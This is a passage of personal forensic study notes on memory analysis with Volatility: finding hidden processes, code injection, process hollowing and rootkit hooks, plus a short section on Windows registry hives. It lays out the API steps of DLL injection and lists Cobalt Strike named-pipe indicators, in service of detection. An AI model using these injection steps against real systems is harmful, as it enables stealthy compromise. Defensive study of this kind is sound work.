- Suspicious process (single or two lettered .exe's, mispelled system processes, system processes with incorrect PPID or didn't start at boot time)
- [Hunt Evil Poster](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Hunt_Evil_Poster.pdf) 
- [EchoTrail](https://www.echotrail.io/)



### Psscan
- Scan physical memory for EPROCESS pool allocations
- By scanning all of memory for process blocks, and not simply following the EPROCESS linked list, hidden processes may be identified
- psscan will also identify processes no loner running
- Lists:
  - Physical Offset of EPROCESS block
  - PID
  - PPID
  - Page directory base offset (PDB)
  - Process start time
  - Process exit time



### Pstree

- Print process list as a tree
- Show verbose information, including image path and commandline used for each procecss (-v)
- Very useful for visually identifying malicious processes spawned by the wrong parent process (i.e Explorer.exe as the parent of svchost.exe)
- ```pstree``` relies upon the EPROCESS linked list and hence will not show unlinked processes
- Lists:
  - Virtual offset of EPROCESS block
  - PID
  - PPID
  - Number of threads
  - Number of handles
  - Process start time
- Can output a Graphiz DOT graph
  - ```vol.py -f memory.img --profile=Win10x64_16299 pstree --output=dot --output-file=pstree.dot```  
- Convert dot file to image (SIFT)
  - ```dot -Tpng pstree.dot -o pstree.png```
- Parent Process of Interest
  - WMI Remoting - WmiPrvSE.exe/scrcons.exe (parent process of ActiveScriptEventConsumers)
  - PowerShell Remoting - Wsmprovhost.exe

### Automating Analysis with Baseline
- Compare memory objects founf in suspect image to those present in a baseline (known good) image
- Provide baseline image (-B)
- Only display items not found in baseline image (-U)
- Only display items present in the baseline (-K)
- Verbose mode (-v)
- Baseline consits of three plugins: processbl, servicebl, and driverbl
- Important information can be gleaned from items present and not present in baseline (e.g an identically named driver with a different file path in the baseline image would only be displayed using the -K option no options at all)
- [baseline.py](https://github.com/csababarta/volatility_plugins/blob/master/baseline.py)
- ```vol.py -f darkcomet.img --profile=Win7SP1x86 -B ./baseline-memory/Win7SP1x86-baseline.img processbl -U 2>error.log```
- [ANALYZING DARKCOMET IN MEMORY](http://www.tekdefense.com/news/2013/12/23/analyzing-darkcomet-in-memory.html)

  

### Rogue Processes Review
- All identified processes should be sanity checked for:
  - Correct/image executable name
  - Correct file location (path)
  - Correct parent process
  - Correct command line and parameters used
  - Start time information

- Volatility provides multiple ways to review processes:
  - pslist: gives a high-level view of what is in the EPROCESS linked list
  - psscan: gives a low-level view, searching for unlinked process blocks
  - pstree: visually shows parent-processes for anomalies
  - malprocfind: scans system for processes for anomalies
  - processbl: allows comparisons with a known good baseline



## Memory Forensics - Master Process

**Compare to baseline image**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 -B ./baseline/Win10x64.img processbl -U 2>>error.log```
- Shows processes not in baseline

**yarascan**  
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_162699 yarascan -y signature-base.yar > yarascan.txt```  
- Note interesting processes their start/exit times, PPID, and PID (included possible LOLBins)

**psscan**  
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 psscan > psscan.txt```  

**pstree**  
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 pstree > pstree.txt```  

**pstree -> dot file**  
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 pstree --output=dot --output-file=pstree.dot```  

**pstree.dot -> png file**  
- ```dot -Tpng pstree.dot -o pstree.png```  
- Note any suspicious parent to child process relationships
- Use [EchoTrail](https://www.echotrail.io/) to better understand processes

**Note times of suspicious processes - pslist**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 pslist | grep -i rundll32 > pslist_rundll32.txt```  
- Document days and time ranges of suspicious files

**List dlls for Suspicious Executables**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 dlllist -p 5948 > pid5948_dlllist.txt```  

**Identify SID and Account Name Used to Start Process**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 getsids -p 8260 > pid8260_getsids.txt```  

**Identify Other Processes Tied to SID**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 getsids | grep -i spsql >  spsql_getsids.txt```  

**Identify Files and Registries Process Interacted With**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 handles -s -t File,Key -p 5948 > pid5948_handles_File_Key.txt```  

**Enumerate Network Connections**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 netscan | egrep -i 'CLOSE|ESTABLISHED|Offset' > netscan.txt```  

**Correlate Process Data to Available Logs**
- ```grep -i WMIPrvSE psscan.txt > WMIPrvSE_psscan.txt```
- Return to your event logs and identify which WMIPrvSE process matches the time recorded for the malicious WMI event consumer in the logs



## Analyze Process Objects - Step 2
- DLLs: Dynamic Linked Libraries (shared code)
- Handles: Pointer to a resource
  - Files: Open files for I/O devices
  - Directories: List of names used for access to kernel objects
  - Registry: Access to a key within with Windows Registry
  - Mutexes/Semaphores: Control/limit access to an object
  - Events: Notifications that help threads communicate and organize
- Threads: Smallest unit of execution; the workhorse of a process
- Memory Sections: Shared memory areas used by process
- Sockets: Network port and connection information with a process



### Object Analysis Plugins
- dlllist - Print list of loaded DLLs for each process
- cmdline - Display commandline args for each process
- getsids - Print the ownership SIDs for each process
- handles - Print list of open handles for each process
- mutantscan - Scan memory of mutant objects (KMUTANT)



### dlllist
- Display the loaded DLLs and the commandline used to start each process
  - Base offset
  - DLL size
  - Load count
  - Load time (newer versions of Volatility only)
  - DLL file path
 
**Important Parameters**
- `--pid`: show infomration for specific process IDs
- `--dump`: extract DLLs from the memory image

- The command line displayed for the process provides full path information, including arguments provided
- LoadTime can help detect anomalies like DLL injection
- A complete list of DLLs can be too much data to review; consider limiting output to specific PIDs with the -p option
- The base offset provided can be used with the ```dlldump``` plugin to extract a specific DLL for analysis



### getsids
- Display Security Identifiers (SIDs) for each process
- Show information for specific process IDs (-p)
- Token information for a suspected process can be useful to determine how it was spawned and with that permissions
- Identifying a system process (e.g scvhost.exe) with a user SID is an important clue that something awry
- [Well Known SIDs](https://docs.microsoft.com/en-US/windows/security/identity-protection/access-control/security-identifiers)
- First line - Account SID
- Everything after - Group SID



### handles
- Also can be known as a pointer
- Print list of handles opened by the process
- Operate only on these process IDs (-p PID)
- Surpress unnamed handles (-s)
- Show only handles of a certain type (-t type)
- Each process can have hundreds or even thousands of handles; reviewing them can be like searching for a needle in a haystack
- Limit your search by looking at specific types (-t) of handles; FIle and Registry handles are excellent for quick wins
  - Process 
  - Thread
  - Key (great place to look)
  - Files (great place to look)
  - Mutant
  - Semaphore
  - Token
  - WmiGuid
  - Port
  - Directory
  - WindowsStation
  - IOCompletion
  - Timer
- ```filescan``` and ```mutantscan``` search for makers indicating FILE_OBJECTS and KMUTANT objects and return their respective results

**Named Pipes (File Handles)**
- [Named Pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes)
- Designed to use SMB
- Allow multiple processes or computers to communicate with each other
- Used by psexec, cobalt strike, covenant, trickbot
- Examples (Cobalt Strike)
  - ```MSSE-####-server```
  - ```msagent_##```
  - ```status_##```
  - ```postex_ssh_####```
  - ```\\.\pipe\######```
  - postex_###

  **Mutants/Mutex**
  - Allows flow control
  - Often used by malware to mark territory
  - Identified by reverse engineers to make IOCs (unique)
  - Limits the access to a resource
  - Malware will "mark" a compromised system so it doesnt get reinfected
  - Process object



### Analyzing Process Objects Review
- Objects that make up a process will provide a clue
  - DLLs
  - Account SID
  - Handles
- Narrow focus to suspect processes or those known to be often subverted (e.g svchost.exe, services.exe, lsass.exe)
- Check process commandline, DLL files paths, and SID, and use hadnles when necessary to provide additional confirmation



## Network Artifacts - Step 3
- Suspicious ports
  - Communication via abnormal ports?
  - Indications of listening ports/backdoors?
- Suspicious Connections
  - External Connections
  - Connections to known bad IPs
  - TCP/UDP connections
  - Creation times
- Suspicious Processes
  - Why does this process have network capability (open sockets)?

**Examples**
- Any process communicating over port 80, 443, or 8080 that is not browser
- Any browser not communicating over port 80, 443, or 8080
- Connections to unexplained internal or external IP addresses
- Web requests directly to an IP address rather than a domain name
- RDP connections (port 3389), particularly if originating from odd or external IP addresses
- DNS requests for unusual domain names
- Workstation to workstaion connections

### Plugins
- XP/2003
  - connections: Print list of active, open TCP connections
  - connscan: Scan memory for TCP connections, including those closed or unlinked
  - sockets: Print list of active, available sockets (any protocol)
  - sockscan: Scan memory for sockets, including, those closed on unlinked
- Vista+
  - netscan: All of the above--scan for both connections and sockets



### netstat
- Identify network sockets and tcp structures resident in memory
- Both active (established) and terminated (closed) TCP connections may be returned
- Pay close attention to the process attached to the connection
- Does a socket or network connection for that process make?
- Creation times available for both sockets and TCP connections
- Lists:
  - Memory offset
  - Protocol
  - Local IP address
  - Remote IP address
  - State (TCP Only)
  - Process ID (PID)
  - Owner Process Name
  - Creation Time
- PowerShell uses port 5985 & 5986
- WMI uses port 135

**UPDATE WITH MY PERSONAL NOTES HERE**
- Utilize [FOR508.3](https://docs.google.com/document/d/1Qaad7OH6f4nMZLjrn4O44pJYngiNaezEe4FD3E3my8Y/edit?tab=t.0)
- TOOL: MemProcFS
- Method of Analysis: MemProcFS Playbook



## Evidence of Code Injection - Step 4
- Camoflauge: Use legitamite process to run
- Access to Memory and Permissions of Target
- Process Migration: Change the process its running under
- Evade A/V and Application Control
- Assist with Complex Attacks (Rootkits)
- Required administrator or debug privileges on the system
  - SeDebugPrivilege



### Code Injection
- Common with modern malware
- Built in Windows Feature
  - VirtualAllocEx()
  - CreateRemoteThread()
  - SetWindowsHookEx()
    - Hook a process's filter functions
- Reflective injection loads code without registering with host process
  - Malware creates its own loader, bypassing common API functions
  - Results in code runnind that is not registered with any host process
- Use of PowerShell-based injection is growing in popularity

### Process Hollowing
- Malware starts a suspended (not running) instance of legitimate process
- Original process code deallocated and replaced
- Can retain DLLs, handles, data, etc from original process
- Process image EXE not backed with file on disk
- [Process Hollowing Analysis](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/analyzing-malware-hollow-processes/)
- Volatility modules
  - hollowfind
  - threadmap

### Simple DLL Injection Explained

<img src="./files/Dll_Injection_1.png">

<img src="./files/Dll_Injection_2.png">

**1. Process Attachment:**

* Attacker uses **OpenProcess()** to gain access to the Victim Process.

**2. Memory Allocation and DLL Path Injection:**

* Attacker Process uses **VirtualAllocEx()** to allocate a memory region within the Victim Process's address space.  
* Attacker uses **WriteProcessMemory()** to write the full path of the malicious DLL into this allocated memory region.

**3. Thread Creation:**

* Attacker uses **CreateRemoteThread()** to start a new thread within the Victim Process's which points to the attacker EXE or DLL.

**4. DLL Loading and Execution:**

* The newly created thread in the Victim Process executes the code that loads the malicious DLL/EXE from disk using **LoadLibraryA()** when the process executes (e.g., user opens file explorer, restarts a browser, opens an application, etc.).

**NOTE I:** In order to use Windows API function (e.g., LoadLibraryA(), the DLL must reside on disk allowing it to identify it using modules within Volatility!

**NOTE II**: There is no legitimate Windows Function to load code from anywhere but disk
- Modern systems isolate system processes from user processes
- Modern malware (Mimikatz and Meterpreter) evade by using API functions:
  - `NtCreateThreadEx`
  - `RtlCreateUserThread`



### Code Injection Plugins
- ldrmodules: Detecting unlinked DLLs and non-memory-mapped files
- malfind: Find hidden and injected code and dump affected memory sections
- hollowfind: Identify evidence of known process hollowing techniques
- threadmap: Analyze threads to identify process hollowing countermeasures
- [DETECTING DECEPTIVE PROCESS HOLLOWING](https://cysinfo.com/detecting-deceptive-hollowing-techniques/)
- [threadmap](https://github.com/kslgroup/threadmap/blob/master/threadmap%20documentation.pdf)



### ldrmodules

#### windows.ldrmodules (Process Environment Block)

* Plugin used to identify process inconsistencies by displaying **3 doubly linked lists** in the PEB for each process which can be cross-referenced.   
  * “True” = DLL was present  
  * “False” = DLL was not present, **may warrant further investigation**

<img src="./files/Windows_Ldrmodules.png">

* Normal entry present within the `winint.exe` process and mapped from `WindowsSystem32ntmarta.dll`.

```bash  
vol.py -f [SAMPLE.img] windows.pslist.PsList  
```  
```bash  
vol.py -f [SAMPLE.img] windows.ldrmodules.LdrModules --pid > ldrmodules.txt  
```
<img src="./files/InLoad_InInt_InMem.png">

**NOTE:** `InInit` **ONLY** tracks DLLs, SO the output of `windows.ldrmodules` may read “True”, “False”, “True”. 

**PEB Code Injection Detection**

***KEY INDICATOR: PEB***  
<img src="./files/Key_Indicator_PEB.png">

* No/Blank Mapped Path Information  
* InLoad, InInit, InMem = “False”  
  * **NOTE:** The InInit column will **ALWAYS** be “False” for process executables, however, no MappedPath is a strong indicator of code injection ([Process Hollowing](https://cysinfo.com/detecting-deceptive-hollowing-techniques/))

- DLLs are tracked in three different linked lists in the PEB for each process
- Stealthy malware can unlink loaded DLLs from these lists
- This plugin queries each list and displays the results for comparison
- Show information for specific process IDs (-p)
- Verbose: Show full paths from each of the three PEB DLL lists (-v)

**Notes**
- Normal DLLs will be in all three lists with a "True" in each column
- Legitimate entries might be missing in some of the lists
  - The process executable will no be present in the "InInit" list
  - Unloaded DLLs not yet removed from process memory
- IF an entry has no "MappedPath" information, it is indicative of a DLL not loaded using the Windows API (usually as sign of injection)

**Fields**
- Process ID
- Process Name
- Base Offset (location in memory pages)
- PEB InLoadOrderModule List ("InLoad") - Order Loaded
- PEB InInitializationOrderModule List ("InInit") - Order Initialized 
- PEB InMemoryOrderModule List ("InMem") - Order in Memory
- VAD Tree Mapped Path

**Data Sources**
- Unlinking from on or more of these lists is simple means for malware to hide injected DLLs
- Dlllist will not show unlinked DLLS
- True within a column means the DLL was present in the list
- Determine DLLs that are unlinked or suspiciously loaded
- Exe's will be missing from the InInit list
- Most DLLS are loaded from:
  - ```\Windows\System32```
  - ```\Program Files```
  - ```\Windows\WinSxS```
- .mui and .fon have same header has executable (false positve)
- Legitimate dlls can be unloaded by process (unlinked) and still show up because its being used by another process
- Volatility will show empty path when it finds an executables not mapped to disk (red flag)
- True - False - True & No mapped path usually mean process hollowing
- False - False - False & No mapped path usually sign of code injection



### Reflective Injection
- Evades using Windows Standard API
- Explicity calls LoadLibrary
- Use a custom reflective loader instead of Windows Loader
- Code is not registered in any way with the hose system, making it very difficult to detect
- Used by metasploit, Cobalt Strike, PowerSploit, Empire, and DoublePulsar
- Memory analysis is well suited for detection

#### [Reflective Code Injection Explained](http://for508.com/qnl7j)

* [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection)  
* [Improved Reflective DLL Injection](https://github.com/dismantl/ImprovedReflectiveDLLInjection)  
* ESSENTIALLY, allowing code to be executed without it being loaded into memory or disk…

**Detection**
1. Memory section marked as Page_Execute_ReadWrite
  - Identify every memory location assigned to process
  - Check permissions
2. Memory section not back with file on disk
3. Memory section contains code (PE file or shellcode)

- ```malfind``` plug in performs first two steps
- Analyst must confirm if section contains code



### malfind
- Scans process memory sections looking indications of hidden code injection
- Identified sections are extracted for further analysis
- Directory to save extracted files (--dump-dir=directory)
- Show information for specific process IDs (-p PID)
- Provide physical offset of a single process to scan (-o offset)
- Fields:
  - Name (Process Name)
  - PID (Process ID)
  - Start (Starting Offset)
  - End (Ending Offset)
  - Tag (Pool tag indicating type of memory section)
  - Hits (Number of hits from YARA signatures)
  - Protect (Memory section permissions)
    - PAGE_EXECUTE_READWRITE indicator of injection

**Notes**
- Although malfind has an impressive hit rate, false positives occur
  - Disassembled code provided can be helpful as a sanity check
- You might see multiple injected sections within the same process
- Dumped sections can reverse engineered or scanned with A/V
- Look for the 'MZ' header to confirm executable (4d 5a 90 00 or 'MZ')
- grep malfind for executables (```| grep -B4 MZ | grep Process```)
- Handling Non-MZ headers (Well known assembly code prologue present in injected memory section)
  - ```
  PUSH EBP
  MOV EBP, ESP
  ADD ESP, 0xfffffa30
  MOV ESI, [EBP+0x8]
  LEA EAX, [ESI+0x3fb]
  PUSH EAX
  PUSH 0x0
  PUSH 0x0
  CALL DWORD [ESI+0x85]
  MOV [ESI+0x8c5], EAX
```
- False Positive (Contains all or mostly 0's)
  - ```
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
```

### malfind Countermeasures
- malfind only shows a "preview" of the first 64 bytes
  - Overwrite first four bytes (MZ magic value)
  - Clear entire PE header (or first 4096)
  - Jump or redirect to code placed later in page
- ```--dump-dir``` option outputs entire contents
  1. Strings, scan with YARA signatures, AV scan
  2. Have a reverse engineer validate the code

### Process Memory Explained

* Explains the structure of how memory is organized for an individual process…

<img src="./files/Process_Memory_Explained.png">

#### *Private Memory*

* Sole domain of the process, not shared with other processes.  
* Allocated using VirtualAlloc API.  
* Includes application data, the process heap, and the process stack.  
* Most memory pages have READWRITE permissions.  
* There **SHOULD NOT** be any executables located in this section!

#### *Shareable Memory*

* Also known as "mapped" memory.  
* Used for mapping files (like .dat, .mui) for use by the process.  
* Can be shared with other processes, but not required.  
* Most permissions are READONLY.

#### *Image Mapped Memory*

* Technically part of shareable memory but tagged differently.  
* Used for mapping executables (EXEs), DLLs, and drivers.  
* Most permissions are EXECUTE_WRITECOPY or EXECUTE_READ.  
* EXECUTE_READWRITE is rarely used and considered a security risk.

**NOTE:** EXEs, DLLs, drivers should **ONLY** be located within the “Image Mapped” section of Process Memory. Executables outside of “Image Mapped” = **RED FLAG**

* [Surveying the user space through user allocations](https://www.sciencedirect.com/science/article/pii/S1742287612000308)  
* [Masking Malicious Memory Artifacts](https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-ii-insights-from-moneta)  
* [Process Doppelganging](https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/)

#### MemProcFS: [FindEvil Detections](https://github.com/ufrisk/MemProcFS/wiki/FS_FindEvil)

`M:forensicfindevilfindevil.txt`

#### *Process Irregularities*

* **PROC_NOLINK:** Process is not part of the normal EPROCESS doubly-linked list, indicating potential removal or manipulation.  
* **PROC_PARENT:** Process has an unexpected parent process, suggesting possible injection or tampering.  
* **PROC_USER:** Process token indicates an unexpected user account context, potentially a sign of privilege escalation or unauthorized access.

#### *Unusual Memory Pages*

* **PE_INJECT:** DLL or EXE files found in memory that are not mapped to the "image" section, suggesting potential code injection or malicious activity.  
* **NOIMAGE_RWX/RX:** Executable memory pages that are not mapped to the "image" section, indicating possible code injection or memory corruption.  
* **PRIVATE_RWX/RX:** Executable memory pages found in private process memory (data, stacks, heaps), which is unusual and may indicate malicious activity.

#### *Flags of Interest*

Various flags that describe the type of memory page the results came from, used to give you an idea of whether a given page was currently in memory or part of the page file.

* **A = Active Page:** This page is currently in use by a process.  
* **T = Transient Page:** This page is not currently in use but is still stored in memory. It may be reused later.  
* **Z = Zero Page:** This page is filled with zeros and is used to quickly allocate new memory pages.  
* **C = Compressed Page:** This page has been compressed to save memory. It may or may not be backed by memory or paged out to the page file.  
* **Pf = Pagefile:** This is a file on disk that is used to store pages that have been removed from physical memory.

<img src="./files/Userland_Process_Inconsistencies.png">

* Deeper investigation (**used to identify the most advanced techniques**) into process internals by identifying and tracking memory objects and identifying inconsistencies of those specific memory structures:   
  * **Process Environment Blocks (PEB)**  
  * **Virtual Address Descriptors (VAD)**  
  * **Page Table Entry (PTE)**

## Hooking and Rootkit Detection - Step 5

* Even deeper forensic investigation techniques to be used for advanced DHAs, **IF** there is cause to believe the presence of a rootkit either through potential DHA attribution, threat intelligence, potential trade-craft, etc. Overall, not very common…
   

[Inside Windows, Rootkits Explained](https://www.scribd.com/document/74418240/Chris-Ries-Inside-Windows-Rootkits)

<img src="./files/Rootkits_Explained.png">

**Rootkit Types (Simple → Complex)**

* Userland  
  * Techniques: Patching, Import Address Table (IAT) hooking, Inline hooking  
  * Countermeasures: Endpoint Security solutions, regular patching, and behavioral analysis.

* Kernel  
  * Techniques: Interrupt Descriptor Table (IDT) hooking, System Service Descriptor Table (SSDT) hooking, Device Object Control (DKOM), and Interrupt Request Packet (IRP) hooking.  
  * Countermeasures: Driver signing, kernel debugging, and advanced memory forensics.

* Hypervisor Bootkits  
  * Techniques: Modifying the boot sector, Master Boot Record (MBR) or GUID Partition Table (GPT), and Volume Boot Record (VBR).  
  * Countermeasures: Secure Boot solutions, UEFI firmware updates, and hardware-based security features.

* Firmware & Hardware  
  * Techniques: Modifying firmware (BIOS/UEFI), microcontroller firmware, or hard drive firmware.  
  * Countermeasures: Hardware-based root-of-trust, secure boot, and firmware updates.


### Rootkit Hooking
- System Service Descriptor Table (SSDT)
  - Kernel Instruction Hooking
  - Every SSDT entry will point to a instructions in either the system kernel (ntoskrnl.exe) or the GUI driver (win32k.sys)
- Interrupt Descriptor Table (IDT)
  - IDT maintains a table of addresses to functions handling interrupts and exceptions
  - Kernel Hooks; not very common on modern systems
- Import Address Table (IAT) and Inline API
  - User-mode DLL function hooking
  - Volatility ```apihooks``` module is best for identifying
- I/O Request Packets (IRP)
  - Driver hooking
  - How OS processes interact with hardware drivers



### Plugins
- ssdt: Display SSDT entries
- psxview: Find hidden processes via cross-view techniques
- modscan: Find modules via pool tag scanning
- apihooks: Find DLL function (inline and trampoline) hooks
- driverirp: Identify I/O Packets (IRP) hooks
- idt: Display Interrupt Descriptor Table Hooks



### ssdt
- Display hooked functions within the System Service Descriptor table (Windows Kernel Hooking)
- The plugin displays every SSDT table entry
- Eliminate legitimate entries pointing within ntoskrnl.exe and win32k.sys
  - ```| egrep -v '(ntoskrnl\.exe | win32k\.sys)'``` or ```| egrep -v '(ntoskrnl|win32k)'```
- Also attempts to discover new tables added by malware



### Direct Kernel Object Manipulation
- DKOM is an advanced process hiding technique
  - Unlink an EPROCESS from the doubly linked list
- Tools like ```tasklist.exe``` and ```pslist.exe``` on a live system are defeated by DKOM
- Use ```psscan```

### psxview
- Performs a cross-view analysis using seven different process listing plugins to visually identify hidden processes
- Limit false positives by using "known good rules" -R
- It's important to know the idiosyncrasies of each source:
  - An entry not found by ```pslist``` could be exited or hidden
  - Processes run early in boot cycle like smss.exe and csrss.exe will not show in ```csrss``` column
  - Processes run before smss.exe will not show in ```session``` and ```deskthrd``` columns
  - Terminated processes might show only in ```psscan``` column
  - If using "-R", well-known anomalies will be marked "Okay"

### modscan and modules
- modules lists modules while modscan scans for them (similar to pslist and psscan)
- Walked link list to identify kernel drivers loaded (modules)
- Scan memory image to find loaded, unloaded, and unlinked kernel modules (modscan plugin)
- Provides a list of loaded drivers, their size and location
- Drivers are a common means for malware to take control; loading a driver gives complete access to kernel objects
- Identifying a bad driver amoung hundreds of others can be hard; other information like hooks and a baseline might help
- Two main way to install rootkit: exploit (rare) or driver (common)

**Notes**
- Automating analysis (baseline plugin)
  - ```vol.py driverbl -f TDSS.img -B baseline.img -U```



### apihooks - Inline DLL Hooking
- Detect inline and Import Address Table function hooks used by rootkits to modify and control information returned
- Operate only on these PIDs (-p PID)
- Skip kernel mode checks (-R)
- Scan only critical processes and dlls (-Q)

**Notes**
- A large number of legitimate hooks can exist; weeding them out take practice and an eye for looking for anomalies
- This plugin can take a long time to run due to the sheer number of locations it must query--be patient
- Now supports x86 and x64 memory images

### Trampoline Hooking
- Indicators
  - ```Hooking module: <unkown>``` (not mapped to disk)
  - Disassembly contains ```JMP <Hook Address>```



## Dump Suspicious Processes and Drivers - Step 6

**UPDATE WITH MY PERSONAL NOTES HERE**
- MemprocFS Notes and commands for extracting files...

### Plugins
- dlldump: Dump DLLs from a process
- moddump: Dump a kernel driver to an executable file sample
- procdump: Dump a process to an execuable file sample
- memdump: Dump all addressable memory for a process into one file
- cmdscan: Scan for COMMAND_HISTORY buffers
- consoles: Scan for CONSOLE_INFORMATION output
- dumpfiles: Extract files by name or physical offset
- filescan: Scan memory for FILE_OBJECTs
- shimcachemem: Extract Application Compatibility Cache artifacts from memory

### dlldump
- Extract DLL files belonging to a specific process or group of processes
- Directory to save extracted files (--dump-dir=directory)
- Dump only from these PIDs (-p PID)
- Dump DLL located at a specifc base offset (-b offset)
- Dump DLLs matching a REGEX name pattern (-r regex)

**Notes**
- Use -p and the -b or -r options to limit the number of DLLs extracted
- Many processes point to the same DLLs, so you might encounter multiple copies of the same DLL extracted



### moddump
- Used to extract kernel drivers from a memory image
- Directory to save extracted files (--dump-dir=directory)
- Dump drivers matching a REGEX name pattern (-r regex)
- Dump driver using offset (-b module base address)
- Use -r or -b options to limit the number of drivers extracted (all kernel drivers dumped by default)
- Find the driver offset using modules or modscan
- ```vol.py -f memory.img moddump -b 0xf7c24000 --dump-dir=./output```



### procdump
- Dump a process to an executable memory sample
- Directory to save extracted files (--dump-dir=directory)
- Dump only these processes (-p PID)
- Specify process by specific offset (-o offset)
- Use regular expression to specify process (-n regex)

**Notes**
- When dumping all processes, the EPROCESS doubly linked list is used (will not dump terminated or unlinked processes)
  - Use the offset (-o option) to dump unlinked processes
- Not all processes will be "paged in" to memory -> an error is provided if the process is not memory resident



### memdump
- Dump every memory section owned by a process into a single file
- Direcotry to save extracted files (--dump-dir=directory)
- Operate only on these PIDs (-p PID)
- Use regular expression to specify process (-n regex)

**Note**
- Use the -p option to limit the number of processes extracted
- The resulting dump file will be much larger than just the process; it contains every memory section owned by the process
- String analysis of the dump can idenitify data items like domain names, IP addresses, and passwords
- vaddump is similar but dumps every section to a separate file



### strings
- Valuable information
  - IP addresses/domain names
  - Malware filenames
  - Internet markers (e.g http://, https://, ftp://)
  - Usernames/email addresses
- Output
  - Byte offset and string
  - Byte offset used to calculate cluster location

**Notes**
- Use -t d option in order to get the exact byte offset
- Strings of interests and their offset can be used to correlate and determine context
- Run once for unicode strings (-e l) and once for ASCII
  - Files can be combined into single file (example conhost)

```bash
vol.py -f memory.img memdump -n conhost --dump-dir=.
```  

```bash
strings -a -t d file > strings.asc
strings -a -t d -e l file >> strings.uni
```  
or

```bash
strings -a -t d file > strings.txt
strings -a -t d -e l file >> strings.txt
sort strings.txt > sorted_strings.txt  
```  
- Alternative for Windows: bstrings.exe



### grep
- -i ignore case
- -A Num print Num lines AFTER pattern match
- -B Num pring Num lines BEFORE pattern match
- -f filename: file with lost of words (Dirty Word List)

```bash
grep -i "command prompt" conhost.uni
```  

### cmdscan and consoles
- Scan csrss.exe (XP) and conhost.exe (Win7) for Command_History and Console_Information residue
- Gathering command history and console output can give insight into user/attacker activities
- ```cmdscan``` provides information from the command history buffer
- ```consoles``` prints commands (inputs) + screen buffer (outputs)
- Plugins can identify info from active and closed sessions



### Windows 10 Memory Compression
- Win 10 has also implemented compression for the pagefile as well as in frequently used areas of RAM
- ```win10memcompression.py```
  - Addition to the volatility project
  - Facilitates decompression as compressed pages of memory are detected
  - Can take advantage of Volatility plugins



### dumpfiles
- Dump File_Objects from memory
- Directory to save extracted files (-D or --dump-dir=)
- Extract using physical offset of File_Object (-Q)
- Extract using regular expression (-r) (add -i for case sensitive)
- Use original filename in output
- Use -n to use original name in output

**Notes**
- Extract documents, logs, executables, and even removable media files
- The ```filescan``` plugin is particulary complementary with ```dumpfiles```  
- No guarantees. References to files may be identified via ```handles``` , ```vadinfo```, and ```filescan```, but files may not be cached

```bash
vol.py -f memory.img dumpfiles -n -i -r \\.exe --dump-dir=./output
```



### filescan
- Scan for File_Objects in memory

**Notes**
- Returns the physical offset where a File_Object exists
- Identifies files in memory even if there are no handles (closed files)
- Finds NTFS special files (such as $MFT) that are not present in the VAD tree or process handles lists
- ```filescan``` is particularly complementary with ```dumpfiles```  

```bash
vol.py -f memory.img filescan
voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
```



### Registry Artifacts - shimcachemem
- Parses the Application Compatibility ShimCache from kernel memory
- --output=csv
- --output-file=filename
- -c, --clean_file_paths: replace path prefixes with C:

**Notes**
- Shimcache is only written to the registry upon a reboot or shutdown
- One of the only tools available to extract cached ShimCache entires directly from kernel memory without requiring a system shutdown
- Contents will often include data not yet written to the registry



### Extracted File Analysis
- AV scannning
- Malware Sandbox
- Dynamic Analysis
- Static malware debugging and disassembly



### Live Analysis
- [Get-InjectedThread](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
- [Kansa Get-InjectedThreads.ps1](https://github.com/davehull/Kansa/blob/master/Modules/Process/Get-InjectedThreads.ps1)
- [hollows_hunter](https://github.com/hasherezade/hollows_hunter/wiki)
- [GRR Rapid Response](https://grr-doc.readthedocs.io/en/v3.4.2.4/release-notes.html)
- [Velociraptor](https://github.com/Velocidex/velociraptor)
- [Veloxity Volcano](https://www.volexity.com/products-overview/volcano/)



---



## Windows Forensics

* [SANS Windows Forensic Analysis Poster](./files/Windows_Forensics_Poster.pdf)



## Registy Overview

**System  Registry Hives**

- %WinDIr%\System32\Config
	- SAM
		- Info about user accounts
		- Password last changed
		- Last logon
		- In user accounts
	- Security
		- Access Control list
		- Stored passwords
	- System
		- Configuration data (hardware)
	- Software
		- Configuration data (software/os)
	- Default
		- Not much of use

**User Registry Hives**

- %UserProfile%
	- NTUSER.DAT
	- Most recently used files
	- Last files searched for
	- Last typed URLs
	- Last commands executed
	- Opened Files
	- Last Saved Files

- %UserProfile%\AppData\Local\Microsoft\Windows\
	- USRCLASS.DAT
	- Program Execution
	- Opened and closed folders
	- Aids User Account Control (UAC)
	- HKCU\Software\Classes

- %WinDir%\appcompat\Programs
	- AMCACHE.hve
	- Excecution data



## Users and Groups

- SAM\Domains\Account\Users\
- Username
- Relative Identifier
- User Login Information
	- Last Login
	- Last Failed Login
	- Logon Count
	- Password Policy
	- Account Creation Time
- Group Information
	- Administrators
	- Users
	- Remote Desktop Users



## System Configuration

**Identify Current Control Set**
- SYSTEM\Select
- Systems Configuration Settings
- Identify what ControlSet is in use
		
**Identify Microsoft OS Version**
- MS Windows Version
	- ProductName
	- ReleaseID (YYMM)
- Service Pack Level
- Install Date of the last version/major update
	- InstallDate
- SOFTWARE\Microsoft\Windows NT\CurrentVersion
		
**Computer Name**
- SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName
- Name linked to log files, network connections
